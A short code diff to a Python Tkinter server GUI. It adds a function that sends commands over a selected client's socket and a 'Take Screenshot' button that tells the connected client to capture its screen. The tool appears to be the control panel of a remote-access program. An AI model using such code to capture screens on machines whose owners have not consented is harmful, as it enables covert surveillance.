@@ -20,6 +20,12 @@ def start_server():
 def close_server():
     server.stop_server()
 
+def send_command(command):
+    if selected_client:
+        client_socket = server.client_sockets.get(selected_client)
+        if client_socket:
+            client_socket.sendall(command.encode())
+
 # Function to update the list of connected clients.
 def update_clients_list(clients):
     for widget in clients_frame.winfo_children():
@@ -43,6 +49,10 @@ def open_client_window(client):
 
     end_button = ttk.Button(client_window, text="Back", command=client_window.destroy)
     end_button.pack(pady=10)
+
+    screenshot_button = ttk.Button(client_window, text="Take Screenshot", command=lambda: send_command("screenshot"))
+    screenshot_button.pack(pady=10)
+    
 
     text_widget = tk.Text(client_window, width=80, height=20, bg="#222222", fg="#ffffff", font=('Helvetica', 12))
     text_widget.pack(pady=10)
